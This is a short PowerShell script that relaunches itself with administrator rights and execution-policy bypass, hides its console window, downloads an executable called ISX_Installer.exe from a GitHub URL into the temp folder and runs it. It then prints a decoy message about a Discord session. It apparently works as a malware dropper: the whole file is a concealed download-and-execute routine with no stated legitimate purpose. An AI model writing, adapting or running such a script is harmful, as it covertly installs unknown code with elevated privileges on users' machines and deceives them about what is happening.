# Check for admin privileges; if not, relaunch the script as admin
If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole] "Administrator"))
{
    # Relaunch the script with elevated permissions and exit this non-elevated instance
    $script = $MyInvocation.MyCommand.Definition
    $arguments = $MyInvocation.UnboundArguments
    $argString = $arguments -join ' '

    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = 'powershell.exe'
    $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$script`" $argString"
    $psi.Verb = 'runas'
    try {
        [Diagnostics.Process]::Start($psi) | Out-Null
    } catch {
        Write-Output "User declined the elevation prompt. Exiting..."
    }
    exit
}

# Hide PowerShell Console Window
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
}
"@
$consolePtr = [Win32]::GetConsoleWindow()
[Win32]::ShowWindow($consolePtr, 0)  # Hide the console window

# Define the download and execution parameters
$url = "https://github.com/Target9/Ob/raw/refs/heads/main/ISX_Installer.exe"  # Direct EXE download
$exePath = Join-Path $env:TEMP ('ISX_Installer.exe')

try {
    Write-Output "Establishing connection..."

    # Download the EXE using WebClient
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($url, $exePath)

    # Validate the download
    if (-not (Test-Path $exePath) -or ((Get-Item $exePath).length -eq 0)) {
        Write-Output "failed. Exiting..."
        exit 1
    }

    # Run the executable
    Start-Process -FilePath $exePath -ArgumentList "-arg1" -NoNewWindow

} catch {
    Write-Output "An error occurred"
} finally {
    Write-Output "unable to detect discord session."
}
